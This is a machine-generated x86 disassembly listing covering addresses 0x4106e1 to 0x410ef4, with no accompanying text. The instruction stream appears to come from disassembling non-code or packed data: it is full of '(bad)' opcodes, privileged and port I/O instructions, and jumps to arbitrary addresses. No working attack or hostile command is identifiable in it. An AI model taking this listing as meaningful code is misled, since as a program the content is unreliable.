  4106e1:	out    dx,al
  4106e2:	mov    ecx,0x6b0c15f1
  4106e7:	cdq    
  4106e8:	jge    0x41072d
  4106ea:	and    BYTE PTR [edi+0x35],0xdc
  4106ee:	out    0xce,al
  4106f0:	xchg   DWORD PTR [edi-0x1ff9c991],edx
  4106f6:	sub    eax,0xc73f54c
  4106fb:	shr    DWORD PTR [edx+0x72e22b3e],cl
  410701:	repz cli 
  410703:	mov    cl,0xe5
  410705:	imul   eax,ebp,0x46
  410708:	pushf  
  410709:	adc    al,0x6b
  41070b:	jae    0x410751
  41070d:	fmul   QWORD PTR ds:0xcd3f583a
  410713:	dec    edx
  410714:	or     BYTE PTR [ebp+0x3f],al
  410717:	xor    DWORD PTR [edi+0x3f8c4e50],eax
  41071d:	adc    ebx,DWORD PTR [edi]
  41071f:	test   ebp,esp
  410721:	hlt    
  410722:	push   ds
  410723:	shl    BYTE PTR [ecx+0x58e0ed6d],0x24
  41072a:	test   al,0x3f
  41072c:	inc    edi
  41072d:	popf   
  41072e:	jle    0x410764
  410730:	mov    eax,ds:0xd6e9349e
  410735:	ds mov ch,0x68
  410738:	inc    esp
  410739:	(bad)  
  41073b:	test   edx,eax
  41073d:	xor    dl,al
  41073f:	sub    DWORD PTR [ecx+0x5c],ebx
  410742:	outs   dx,DWORD PTR ds:[esi]
  410743:	or     eax,0x42176362
  410748:	jmp    0x4106dc
  41074a:	adc    edi,DWORD PTR [eax+0x460be4b0]
  410750:	gs pop ecx
  410752:	push   edx
  410753:	sbb    BYTE PTR [ebx+0x7e9306fd],ch
  410759:	cli    
  41075a:	idiv   DWORD PTR ss:[ecx+0x6707d51e]
  410761:	mov    eax,ds:0x8bb33892
  410766:	mov    eax,0x6b638644
  41076b:	loopne 0x4106f3
  41076d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41076e:	mov    dl,0xed
  410770:	clc    
  410771:	adc    DWORD PTR [edx-0x6a],ecx
  410774:	retf   0x28cd
  410777:	aaa    
  410778:	pop    edi
  410779:	ins    BYTE PTR es:[edi],dx
  41077a:	stos   BYTE PTR es:[edi],al
  41077b:	sbb    bh,0xfd
  41077e:	pop    edx
  41077f:	jmp    FWORD PTR [ebp+eiz*1+0x44]
  410783:	sahf   
  410784:	jo     0x41078c
  410786:	sub    BYTE PTR [edi],dl
  410788:	push   ebx
  410789:	scas   al,BYTE PTR es:[edi]
  41078a:	int3   
  41078b:	(bad)
  41078f:	or     BYTE PTR [eax],0x8f
  410792:	cwde   
  410793:	ins    DWORD PTR es:[edi],dx
  410794:	aaa    
  410795:	xor    ebp,DWORD PTR [ebx]
  410797:	jmp    0x410745
  410799:	lock in al,0xbf
  41079c:	push   cs
  41079d:	(bad)  
  41079e:	dec    edx
  41079f:	clc    
  4107a0:	push   ebx
  4107a1:	inc    edi
  4107a2:	inc    edx
  4107a3:	enter  0x39b6,0xfc
  4107a7:	push   ebx
  4107a8:	cmp    DWORD PTR [esi-0xd6313fa],eax
  4107ae:	cmc    
  4107af:	ret    
  4107b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107b1:	and    ebp,DWORD PTR [edx*8-0x420b2b40]
  4107b8:	pop    ebp
  4107b9:	(bad)  
  4107ba:	std    
  4107bb:	aaa    
  4107bc:	int    0x26
  4107be:	mov    ebp,DWORD PTR [edx]
  4107c0:	ja     0x4107f3
  4107c2:	repnz stc 
  4107c4:	add    ch,BYTE PTR [edx]
  4107c6:	jno    0x410776
  4107c8:	aad    0xd7
  4107ca:	out    dx,eax
  4107cb:	adc    al,0x78
  4107cd:	cmp    al,0x3c
  4107cf:	push   cs
  4107d0:	out    0x4f,al
  4107d2:	mov    eax,0x68eafbe
  4107d7:	push   ecx
  4107d8:	jno    0x4107d7
  4107da:	pop    ds
  4107db:	pop    ss
  4107dc:	aad    0xe7
  4107de:	add    cl,dl
  4107e0:	push   cs
  4107e1:	(bad)  
  4107e3:	sti    
  4107e4:	push   ss
  4107e5:	and    eax,0xa837ed94
  4107ea:	mov    al,ds:0xce9cccb7
  4107ef:	cmc    
  4107f0:	test   eax,0xd24b8a2f
  4107f5:	fwait
  4107f6:	mov    WORD PTR [edx+0x46c092ca],gs
  4107fc:	pop    ss
  4107fd:	push   eax
  4107fe:	(bad)  
  4107ff:	fs xchg edi,eax
  410801:	stos   DWORD PTR es:[edi],eax
  410802:	push   ds
  410803:	std    
  410804:	int    0xba
  410806:	aas    
  410807:	ret    
  410808:	popf   
  410809:	lds    ecx,FWORD PTR [eax]
  41080b:	jo     0x4107d4
  41080d:	jnp    0x4107af
  41080f:	ins    BYTE PTR es:[edi],dx
  410810:	mov    cs,WORD PTR [ecx-0x240a34f1]
  410816:	add    DWORD PTR [eax-0x32ab75d9],0xffffff9c
  41081d:	loope  0x410859
  41081f:	sti    
  410820:	popa   
  410821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410822:	out    0x45,al
  410824:	loopne 0x410855
  410826:	mov    eax,ds:0x9a1d83b5
  41082b:	pop    edi
  41082c:	js     0x41080e
  41082e:	sbb    DWORD PTR [esi+0x76a74443],edi
  410834:	aam    0xf3
  410836:	or     al,0x2c
  410838:	jg     0x4107c7
  41083a:	(bad)  
  41083b:	cmp    DWORD PTR es:[ebp+0xb9ac90a],ebp
  410842:	pop    edi
  410843:	cmc    
  410844:	and    DWORD PTR [ebx+0x79],0x48
  410848:	and    eax,0x509be658
  41084d:	adc    eax,0xd52f5a
  410852:	sbb    al,0x1
  410854:	nop
  410855:	(bad)  
  410856:	dec    eax
  410857:	mov    cl,bl
  410859:	cli    
  41085a:	cmp    eax,0x410363f1
  41085f:	sub    eax,DWORD PTR [edi+eax*1-0xea49124]
  410866:	popf   
  410867:	(bad)  
  410868:	out    dx,al
  410869:	sub    al,0x88
  41086b:	ins    BYTE PTR es:[edi],dx
  41086c:	mov    ebx,0x48ea6021
  410871:	sub    bh,BYTE PTR [ebx+0x44687621]
  410877:	out    0xa,eax
  410879:	jns    0x410818
  41087b:	mov    ecx,0xbb324f90
  410880:	iret   
  410881:	mov    al,ds:0xa3197228
  410886:	jne    0x41086b
  410888:	xor    ah,bh
  41088a:	xlat   BYTE PTR ds:[ebx]
  41088b:	mov    esp,0xa0b6c174
  410890:	cli    
  410891:	push   ecx
  410892:	clc    
  410893:	fimul  WORD PTR [eax]
  410895:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  410897:	aam    0x85
  410899:	jmp    0x2fec:0x6b18d18c
  4108a0:	ds ins DWORD PTR es:[edi],dx
  4108a2:	jmp    0x4108e0
  4108a4:	mov    dl,0x7e
  4108a6:	or     esi,ecx
  4108a8:	xor    eax,0x4e6105e1
  4108ad:	es and al,0x72
  4108b0:	fldcw  WORD PTR [esi+0x5138f670]
  4108b6:	cli    
  4108b7:	sub    eax,0x5adf1116
  4108bc:	pop    ebp
  4108bd:	adc    eax,0x43a6a8f7
  4108c2:	scas   eax,DWORD PTR es:[edi]
  4108c3:	add    ebx,ebp
  4108c5:	mov    dl,0x43
  4108c7:	mov    dh,0x89
  4108c9:	inc    edi
  4108ca:	dec    esi
  4108cb:	adc    edi,DWORD PTR [edi]
  4108cd:	jns    0x410878
  4108cf:	test   DWORD PTR [ebp+0x7a0249e3],edx
  4108d5:	cmp    eax,0x8e1c46fe
  4108da:	xchg   ebx,eax
  4108db:	cmp    ah,al
  4108dd:	inc    eax
  4108de:	cmp    eax,ecx
  4108e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108e1:	mov    BYTE PTR [esi-0xcbb9e22],0x59
  4108e8:	sub    esi,ecx
  4108ea:	cmp    DWORD PTR [edx+0x4d10f3b9],ebx
  4108f0:	sub    ch,0x70
  4108f3:	ror    BYTE PTR [esi-0xeed5fff],cl
  4108f9:	adc    eax,0x9c5ff6af
  4108fe:	and    eax,0x45a97f21
  410903:	stos   DWORD PTR es:[edi],eax
  410904:	in     al,dx
  410905:	jmp    0x4108ff
  410907:	and    eax,0x959a8091
  41090c:	mov    esi,DWORD PTR [ebp-0x80]
  41090f:	jl     0x410896
  410911:	mov    ch,0xe0
  410913:	lods   al,BYTE PTR ds:[esi]
  410914:	sub    eax,0x60c1ba1e
  410919:	ins    BYTE PTR es:[edi],dx
  41091a:	out    0x6e,eax
  41091c:	dec    eax
  41091d:	sti    
  41091e:	gs add al,0xee
  410921:	pop    edx
  410922:	jbe    0x410990
  410924:	cmp    al,0xa1
  410926:	xor    BYTE PTR [esi+0xa83e02e],dh
  41092c:	mov    edx,0xbf335a5e
  410931:	test   DWORD PTR [esi],esp
  410933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410934:	loop   0x41096f
  410936:	sbb    BYTE PTR [edx-0x2ee530b],dh
  41093c:	test   DWORD PTR [ebx],ebx
  41093e:	mov    ds:0x561e73b3,al
  410943:	push   0x7bf8cc8e
  410948:	leave  
  410949:	mov    ds:0xe30c072f,eax
  41094e:	jmp    0x18abff68
  410953:	dec    ebp
  410954:	call   FWORD PTR [edx]
  410956:	(bad)  
  410957:	in     al,dx
  410958:	cdq    
  410959:	pop    eax
  41095a:	mov    eax,0x5fb29347
  41095f:	dec    eax
  410960:	adc    eax,0x57b72569
  410965:	aam    0x26
  410967:	cmp    dh,BYTE PTR [esi]
  410969:	cmp    DWORD PTR [ebx],ebp
  41096b:	mov    dl,0x87
  41096d:	lahf   
  41096e:	mov    ds:0xcc7322ee,al
  410973:	pop    ecx
  410974:	pusha  
  410975:	and    al,0x6c
  410977:	lahf   
  410978:	sbb    al,BYTE PTR [eax-0xf]
  41097b:	ja     0x410987
  41097d:	push   0x1b8bb14e
  410982:	fst    DWORD PTR [edx]
  410984:	out    dx,eax
  410985:	add    edi,esp
  410987:	xchg   edi,eax
  410988:	and    eax,0x354ca603
  41098d:	rcr    ch,0xb4
  410990:	cmp    al,0x2d
  410992:	jp     0x4109d2
  410994:	fwait
  410995:	in     eax,0xb5
  410997:	jnp    0x41095e
  410999:	and    bl,BYTE PTR [edi]
  41099b:	daa    
  41099c:	cmp    ebx,DWORD PTR [ebp-0x4a]
  41099f:	into   
  4109a0:	or     BYTE PTR [edi],al
  4109a2:	cs dec ebp
  4109a4:	ss pop ss
  4109a6:	jnp    0x41095d
  4109a8:	jns    0x4109cd
  4109aa:	stos   BYTE PTR es:[edi],al
  4109ab:	and    eax,0xebb33280
  4109b0:	outs   dx,BYTE PTR ds:[esi]
  4109b1:	push   ss
  4109b2:	inc    ebx
  4109b3:	jno    0x41098c
  4109b5:	imul   ebp,edi,0x69
  4109b8:	add    eax,0xf8b0399b
  4109bd:	jo     0x410980
  4109bf:	icebp  
  4109c0:	je     0x4109c0
  4109c2:	xor    esp,ebx
  4109c4:	push   esp
  4109c5:	shl    DWORD PTR [edi-0x325762ca],cl
  4109cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109cc:	(bad)  
  4109ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109cf:	pop    ss
  4109d0:	cmp    BYTE PTR [ecx+0x4e],bl
  4109d3:	lock and BYTE PTR [eax-0xce0d462],0x5
  4109db:	add    eax,DWORD PTR [ebp-0x3c946bf]
  4109e1:	add    esi,DWORD PTR [esi+0x59]
  4109e4:	push   ebx
  4109e5:	jae    0x4109f0
  4109e7:	into   
  4109e8:	fdivr  DWORD PTR [edx-0x20]
  4109eb:	mov    ds:0x484a3f9f,al
  4109f0:	push   ss
  4109f1:	sub    esi,DWORD PTR [ebp-0x459f7f03]
  4109f7:	xor    bl,al
  4109f9:	push   ebp
  4109fa:	aaa    
  4109fb:	js     0x410a75
  4109fd:	jno    0x4109b2
  4109ff:	sub    DWORD PTR [edx-0x7e],0xffffff94
  410a03:	daa    
  410a04:	jns    0x4109d2
  410a06:	push   eax
  410a07:	(bad)  [edx-0x14]
  410a0a:	mov    ds:0x926b636a,eax
  410a0f:	loopne 0x410a60
  410a11:	pop    ebp
  410a12:	jb     0x4109bb
  410a14:	in     al,dx
  410a15:	push   ss
  410a16:	inc    ecx
  410a17:	sbb    ch,BYTE PTR [ecx]
  410a19:	clc    
  410a1a:	add    ebx,DWORD PTR [edx+0x67af0641]
  410a20:	jp     0x410a71
  410a22:	xor    esp,DWORD PTR [ecx]
  410a24:	sbb    dh,BYTE PTR [edx-0x64bca381]
  410a2a:	xchg   edi,eax
  410a2b:	test   DWORD PTR [ecx],ecx
  410a2d:	sub    al,0xd4
  410a2f:	lds    ecx,FWORD PTR [esi-0x14]
  410a32:	ret    0x3e9
  410a35:	rcr    ecx,cl
  410a37:	cmp    BYTE PTR es:[esi],0xb8
  410a3b:	xchg   ebx,eax
  410a3c:	ror    esp,1
  410a3e:	mov    ecx,0x719795e6
  410a43:	cmp    eax,DWORD PTR [edx-0x7b2a1167]
  410a49:	push   edi
  410a4a:	(bad)  
  410a4b:	lea    esi,[edx]
  410a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a4e:	div    DWORD PTR [edi-0x31]
  410a51:	fidiv  WORD PTR [ecx+0x357c08f4]
  410a57:	mov    ebp,DWORD PTR [eax]
  410a59:	clc    
  410a5a:	jmp    0x410a86
  410a5c:	outs   dx,BYTE PTR ds:[esi]
  410a5d:	cmc    
  410a5e:	aas    
  410a5f:	add    eax,eax
  410a61:	int3   
  410a62:	ss leave 
  410a64:	std    
  410a65:	(bad)  [ebx+0x6a]
  410a68:	popa   
  410a69:	lahf   
  410a6a:	pop    ecx
  410a6b:	or     WORD PTR [edx],bx
  410a6e:	mov    ss,WORD PTR [ebx-0x2a]
  410a71:	popf   
  410a72:	cmp    al,0x74
  410a74:	enter  0xcbd4,0xf1
  410a78:	lahf   
  410a79:	mov    ss,WORD PTR [edi-0x1f]
  410a7c:	outs   dx,DWORD PTR ds:[esi]
  410a7d:	add    bh,BYTE PTR [ebp+esi*4-0x2]
  410a81:	mov    esi,0x50e0cff7
  410a86:	sub    esp,DWORD PTR [ebx+0x56874435]
  410a8c:	bnd jns 0x410a9f
  410a8f:	dec    esi
  410a90:	cmp    BYTE PTR [esp+ebp*8+0x7043c13],bh
  410a97:	dec    edx
  410a98:	pop    esp
  410a99:	fidivr DWORD PTR [ebx+0x4]
  410a9c:	jno    0x410aee
  410a9e:	dec    ebx
  410a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aa0:	js     0x410afe
  410aa2:	add    eax,0x26652c3d
  410aa7:	addr16 pop ebp
  410aa9:	retf   
  410aaa:	push   eax
  410aab:	jne    0x410aba
  410aad:	dec    ebx
  410aae:	std    
  410aaf:	mov    eax,0xd81f0a17
  410ab4:	mov    eax,0x734b479e
  410ab9:	loopne 0x410aaa
  410abb:	xchg   al,cl
  410abd:	popf   
  410abe:	add    eax,0xf99bea42
  410ac3:	sbb    eax,0x32e477d5
  410ac8:	call   0x17b83bd8
  410acd:	mov    esp,ecx
  410acf:	sahf   
  410ad0:	ss sub esp,esi
  410ad3:	imul   edi,edi,0xec28331e
  410ad9:	or     eax,0x6c045f90
  410ade:	inc    esi
  410adf:	ror    ecx,0xde
  410ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ae3:	mov    ds:0x269f1e92,al
  410ae8:	inc    edi
  410ae9:	push   0xe137299e
  410aee:	jg     0x410aac
  410af0:	dec    edx
  410af1:	dec    ebp
  410af2:	sbb    esi,DWORD PTR [eax+ecx*1+0x3ad0bd8b]
  410af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410afa:	mov    ebp,0x4b8a33d2
  410aff:	or     BYTE PTR [edi],ah
  410b01:	mov    ecx,fs
  410b03:	fnstenv [ecx-0x64]
  410b06:	xchg   esp,eax
  410b07:	push   edi
  410b08:	(bad)  
  410b0a:	js     0x410b16
  410b0c:	ret    
  410b0d:	inc    ecx
  410b0e:	clc    
  410b0f:	in     eax,0xd4
  410b11:	ja     0x410b73
  410b13:	pop    ss
  410b14:	push   edi
  410b15:	sub    DWORD PTR [eax],ecx
  410b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b18:	pop    eax
  410b19:	dec    edi
  410b1a:	or     al,0xa
  410b1c:	loopne 0x410aa0
  410b1e:	inc    edi
  410b1f:	pop    ecx
  410b20:	stos   DWORD PTR es:[edi],eax
  410b21:	push   esp
  410b22:	adc    BYTE PTR [ebx-0x20c516a9],0xfc
  410b29:	or     cl,BYTE PTR [ecx+0x6dd67de6]
  410b2f:	push   ss
  410b30:	pop    edi
  410b31:	sahf   
  410b32:	das    
  410b33:	sbb    ebp,DWORD PTR [ebp+0x10]
  410b36:	pop    ss
  410b37:	(bad)  
  410b38:	aam    0xa0
  410b3a:	push   es
  410b3b:	jae    0x410ac8
  410b3d:	ins    DWORD PTR es:[edi],dx
  410b3e:	push   cs
  410b3f:	sbb    al,BYTE PTR [edi+0x2f]
  410b42:	ret    
  410b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b44:	xchg   DWORD PTR [esi+0x5784f6ed],ebp
  410b4a:	push   ebp
  410b4b:	loope  0x410b52
  410b4d:	add    ebx,DWORD PTR [ebx+0x66]
  410b50:	push   esp
  410b51:	sub    DWORD PTR [ecx-0x41526310],edx
  410b57:	ja     0x410af3
  410b59:	push   eax
  410b5a:	inc    ecx
  410b5b:	cmp    al,BYTE PTR [edx-0x4b]
  410b5e:	(bad)  
  410b5f:	jmp    0x153270a1
  410b64:	push   eax
  410b65:	lds    ebp,FWORD PTR [ebx+0x17f56476]
  410b6b:	and    eax,0xfc73b726
  410b70:	fcomp  DWORD PTR [edi]
  410b72:	adc    BYTE PTR [esi],0x64
  410b75:	and    BYTE PTR ds:0x5b0e6525,dh
  410b7b:	add    al,0x2b
  410b7d:	mov    dh,0xe9
  410b7f:	fmul   QWORD PTR [edx]
  410b81:	scas   al,BYTE PTR es:[edi]
  410b82:	fsubr  QWORD PTR ds:0x4c5bff3f
  410b88:	pop    ss
  410b89:	sti    
  410b8a:	add    eax,DWORD PTR [ebx+0x5501f67f]
  410b90:	xlat   BYTE PTR ds:[ebx]
  410b91:	cmp    eax,DWORD PTR [esi+0x55dd7a4b]
  410b97:	jno    0x410b5f
  410b99:	or     ecx,esi
  410b9b:	push   esi
  410b9c:	or     ebp,DWORD PTR [ebp+ecx*4+0x51]
  410ba0:	mov    ah,0x2f
  410ba2:	into   
  410ba3:	inc    ecx
  410ba4:	sbb    al,0xd7
  410ba6:	pop    ecx
  410ba7:	sbb    DWORD PTR [edi-0x1d],eax
  410baa:	sub    ecx,DWORD PTR [ebp+ebp*1-0x4d]
  410bae:	repnz scas eax,DWORD PTR es:[edi]
  410bb0:	sub    DWORD PTR [ebx],eax
  410bb2:	mov    bh,0x6b
  410bb4:	sti    
  410bb5:	adc    al,0x94
  410bb7:	loop   0x410b60
  410bb9:	imul   esi,DWORD PTR [ebp-0x2b],0xe11e4b68
  410bc0:	and    al,BYTE PTR [edi+0x6708f45d]
  410bc6:	aas    
  410bc7:	xlat   BYTE PTR ds:[ebx]
  410bc8:	mov    bl,0xfd
  410bca:	pop    edx
  410bcb:	fld    QWORD PTR [edx+edi*4-0x7a68499]
  410bd2:	packuswb mm4,QWORD PTR [edi+edi*2]
  410bd6:	dec    esp
  410bd7:	into   
  410bd8:	in     al,0x66
  410bda:	leave  
  410bdb:	pusha  
  410bdc:	mov    eax,ds:0x3c7ff547
  410be1:	mov    ecx,0xda5dd995
  410be6:	(bad)  
  410be7:	in     eax,0x9c
  410be9:	jg     0x410b75
  410beb:	jg     0x410b9c
  410bed:	xor    ah,al
  410bef:	(bad)  
  410bf0:	adc    esi,eax
  410bf2:	xor    eax,0x8a736e67
  410bf7:	jle    0x410c52
  410bf9:	rcl    BYTE PTR [eax+0x1d50a888],cl
  410bff:	xchg   edx,eax
  410c00:	mov    al,0xf0
  410c02:	xor    BYTE PTR [ecx+edx*1],ch
  410c05:	out    0xe3,eax
  410c07:	mov    edi,0x8d871c98
  410c0c:	xchg   esp,eax
  410c0d:	jbe    0x410bcf
  410c0f:	adc    al,0xe7
  410c11:	mov    DWORD PTR [ebp-0x35],ecx
  410c14:	es sub al,0x4c
  410c17:	jae    0x410c46
  410c19:	imul   esi,DWORD PTR [ebp+0x5b],0xbb09783f
  410c20:	lahf   
  410c21:	add    cl,BYTE PTR [edx]
  410c23:	inc    eax
  410c24:	cmp    ch,al
  410c26:	and    dh,BYTE PTR [eax-0x2dfd2389]
  410c2c:	retf   
  410c2d:	xchg   edx,esi
  410c2f:	popf   
  410c30:	out    dx,al
  410c31:	or     esp,DWORD PTR [esi+0x71]
  410c34:	sub    eax,0xeb61ae91
  410c39:	imul   ecx,DWORD PTR [esi],0xa76eef7b
  410c3f:	sub    dl,BYTE PTR [eax+edx*8-0x23c3fa68]
  410c46:	mov    ds:0x26d1e1d6,eax
  410c4b:	(bad)  
  410c4c:	(bad)  
  410c4d:	std    
  410c4e:	or     al,cl
  410c50:	pop    ecx
  410c51:	jb     0x410bdb
  410c53:	cmp    ch,BYTE PTR [ebx-0x1813a4e4]
  410c59:	mov    ecx,0xd3f42aa
  410c5e:	cmp    esp,DWORD PTR [eax+ebp*8]
  410c61:	mov    eax,0x6cb748ab
  410c66:	pop    eax
  410c67:	das    
  410c68:	xchg   BYTE PTR [esi],dl
  410c6a:	or     al,0x81
  410c6c:	scas   eax,DWORD PTR es:[edi]
  410c6d:	mov    eax,ds:0x4133e004
  410c72:	inc    ebx
  410c73:	(bad)  
  410c74:	fwait
  410c75:	inc    esp
  410c76:	inc    edi
  410c77:	cs popf 
  410c79:	xchg   ebx,eax
  410c7a:	scas   al,BYTE PTR es:[edi]
  410c7b:	push   0x71
  410c7d:	jmp    0x410cbe
  410c7f:	shr    DWORD PTR [edi-0x6],1
  410c82:	and    eax,0x12f6871a
  410c87:	das    
  410c88:	pop    ss
  410c89:	jp     0x410d02
  410c8b:	xchg   edx,eax
  410c8c:	pop    eax
  410c8d:	mov    ch,0x13
  410c8f:	fidivr DWORD PTR [eax+0x29a772cd]
  410c95:	les    edx,FWORD PTR [ecx]
	...
  410d13:	add    BYTE PTR [ecx-0x4046497c],bh
  410d19:	mov    ebx,0xac284bf
  410d1e:	mov    ebp,DWORD PTR [edx-0x45]
  410d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d22:	inc    ecx
  410d23:	jno    0x410ce7
  410d25:	mov    bh,0x0
  410d27:	add    BYTE PTR [ebx+0x7],ch
  410d2a:	add    BYTE PTR [eax],al
  410d2c:	mov    ds:0xc6eb70b3,eax
  410d31:	cmp    BYTE PTR [esi],dl
  410d33:	mov    al,ds:0x5e7d222f
  410d38:	mov    bh,0x29
  410d3a:	add    BYTE PTR ds:0x8f2bc4f,dl
  410d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d41:	push   0x53
  410d43:	ins    DWORD PTR es:[edi],dx
  410d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d45:	cld    
  410d46:	call   0xd44c:0x25956675
  410d4d:	aam    0xb0
  410d4f:	and    BYTE PTR [ebp+0x41],ch
  410d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d53:	pop    es
  410d54:	stos   DWORD PTR es:[edi],eax
  410d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d56:	mov    ch,0xb8
  410d58:	pop    edi
  410d59:	or     esi,edi
  410d5b:	out    0xfc,eax
  410d5d:	in     al,dx
  410d5e:	popf   
  410d5f:	ss xchg esi,eax
  410d61:	jge    0x410cf6
  410d63:	in     eax,0xd1
  410d65:	jmp    0x973f58b5
  410d6a:	mov    cl,0x3
  410d6c:	fcmovnbe st,st(2)
  410d6e:	xor    al,bh
  410d70:	mov    esi,0x1d627e41
  410d76:	pop    esp
  410d77:	aam    0x17
  410d79:	ret    0x3075
  410d7c:	pop    edx
  410d7d:	rep stos DWORD PTR es:[edi],eax
  410d7f:	ins    DWORD PTR es:[edi],dx
  410d80:	sbb    BYTE PTR [esi+ebp*4],0xf4
  410d84:	inc    eax
  410d85:	lds    esp,FWORD PTR gs:[ecx]
  410d88:	lahf   
  410d89:	sbb    eax,0x9452373f
  410d8e:	push   DWORD PTR ss:[edx+eiz*1+0x36b6eb1b]
  410d96:	mov    ah,0x8d
  410d98:	jb     0x410d41
  410d9a:	mov    edi,0xfe168430
  410d9f:	or     dl,BYTE PTR [ebp+0x6c]
  410da2:	mov    eax,ds:0x42a01fbf
  410da7:	ins    BYTE PTR es:[edi],dx
  410da8:	cmp    eax,0x798dee62
  410dad:	pop    ebx
  410dae:	mov    ah,0x7b
  410db0:	push   eax
  410db1:	ins    DWORD PTR es:[edi],dx
  410db2:	cdq    
  410db3:	push   esi
  410db4:	mov    dl,0x6c
  410db6:	cmp    eax,0x301cbcd9
  410dbb:	das    
  410dbc:	push   0xffffffd3
  410dbe:	mov    esp,0x7f70b1fe
  410dc3:	ds daa 
  410dc5:	popf   
  410dc6:	push   ebp
  410dc7:	pushf  
  410dc8:	jp     0x410db8
  410dca:	cli    
  410dcb:	cli    
  410dcc:	jne    0x410db7
  410dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dcf:	dec    esp
  410dd0:	je     0x410d7a
  410dd2:	imul   ecx,DWORD PTR [eax],0x3a
  410dd5:	aad    0xa5
  410dd7:	mov    ch,0x85
  410dd9:	nop    DWORD PTR [ecx]
  410ddc:	and    bh,bl
  410dde:	leave  
  410ddf:	mov    cl,0xb7
  410de1:	jns    0x410df5
  410de3:	jle    0x410e3f
  410de5:	sbb    al,0x45
  410de7:	das    
  410de8:	lea    ecx,[ebx+0x23]
  410deb:	stos   BYTE PTR es:[edi],al
  410dec:	cmp    DWORD PTR [ebx],edx
  410dee:	add    DWORD PTR [ecx+0x79d1ada6],edi
  410df4:	pop    ds
  410df5:	ret    
  410df6:	add    al,0x83
  410df8:	mov    ds:0xf3ec8b80,eax
  410dfd:	nop
  410dfe:	stc    
  410dff:	es xchg ebp,eax
  410e01:	sub    eax,DWORD PTR [esi-0x4cd7e0d9]
  410e07:	out    dx,al
  410e08:	pop    esp
  410e09:	aaa    
  410e0a:	cmp    esp,ebx
  410e0c:	fs sub ebp,ecx
  410e0f:	mov    esp,0xabbbb470
  410e14:	mov    bl,0x15
  410e16:	imul   ebx,esp,0xfb336d5a
  410e1c:	pusha  
  410e1d:	call   0x6111d953
  410e22:	pop    ecx
  410e23:	das    
  410e24:	pop    ecx
  410e25:	cmp    dh,BYTE PTR [ebp-0x45c90203]
  410e2b:	pusha  
  410e2c:	cmp    ebp,DWORD PTR [edx]
  410e2e:	mov    edi,DWORD PTR [eax+edi*2]
  410e31:	pop    ds
  410e32:	mov    dl,0x6e
  410e34:	out    dx,al
  410e35:	adc    DWORD PTR [eax+0x2df0bced],esp
  410e3b:	neg    ah
  410e3d:	xchg   ebp,eax
  410e3e:	adc    DWORD PTR [esi-0x1ae8ac31],esp
  410e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e45:	pop    esi
  410e46:	out    0xb7,eax
  410e48:	sbb    DWORD PTR [edi],edi
  410e4a:	leave  
  410e4b:	xor    eax,0x20420f3c
  410e50:	ret    0x95b7
  410e53:	faddp  st(1),st
  410e55:	or     eax,0x1e5cc196
  410e5a:	aas    
  410e5b:	or     esp,DWORD PTR [eax-0xd]
  410e5e:	aad    0xb6
  410e60:	jae    0x410e4d
  410e62:	sbb    BYTE PTR [edi-0x1f],ch
  410e65:	pop    ebx
  410e66:	cdq    
  410e67:	fcmovnu st,st(6)
  410e69:	aam    0xc2
  410e6b:	add    eax,0x2a8b149
  410e70:	adc    eax,DWORD PTR [ecx+0x58]
  410e73:	enter  0xc8b6,0x10
  410e77:	jecxz  0x410ecf
  410e79:	fstp   TBYTE PTR [edx+0x17]
  410e7d:	out    0x99,eax
  410e7f:	mov    edi,DWORD PTR [eax]
  410e81:	mov    esp,0xe0991ea1
  410e86:	(bad)  [edi+0x2d]
  410e89:	inc    ebp
  410e8a:	retf   
  410e8b:	inc    edi
  410e8c:	pop    edx
  410e8d:	sub    BYTE PTR [edx],bh
  410e8f:	ins    BYTE PTR es:[edi],dx
  410e90:	xor    al,0x21
  410e92:	jmp    0xc875:0x67073b1d
  410e99:	sbb    DWORD PTR [esi+0x1e1e39f6],0x10ccdd6b
  410ea3:	jmp    0xaa66:0xe0a9ea75
  410eaa:	or     eax,DWORD PTR [ebx]
  410eac:	in     al,dx
  410ead:	test   DWORD PTR [eax],eax
  410eaf:	scas   al,BYTE PTR es:[edi]
  410eb0:	mov    BYTE PTR [eax+ecx*2-0x17f83ac7],dh
  410eb7:	adc    edi,edi
  410eb9:	mov    ds:0x2663b8ea,al
  410ebe:	retf   
  410ebf:	in     al,0x7c
  410ec1:	adc    bl,cl
  410ec3:	jmp    0x184e:0x4e6b888d
  410eca:	sbb    dl,BYTE PTR [edi+ebp*4-0x677ae347]
  410ed1:	(bad)  
  410ed2:	in     eax,dx
  410ed3:	dec    ebx
  410ed4:	lods   eax,DWORD PTR ds:[esi]
  410ed5:	push   ss
  410ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed7:	mov    ah,BYTE PTR [edi+0x1a]
  410eda:	ins    DWORD PTR es:[edi],dx
  410edb:	jo     0x410f4e
  410edd:	pop    esp
  410ede:	icebp  
  410edf:	add    esp,DWORD PTR [ebp+eax*4+0x6b3e4ba7]
  410ee6:	inc    edi
  410ee7:	sahf   
  410ee8:	dec    ebp
  410ee9:	lahf   
  410eea:	dec    edx
  410eeb:	cmp    BYTE PTR [eax-0x1d0248aa],bh
  410ef1:	adc    cl,cl
  410ef3:	pop    eax
  410ef4:	dec    ebx
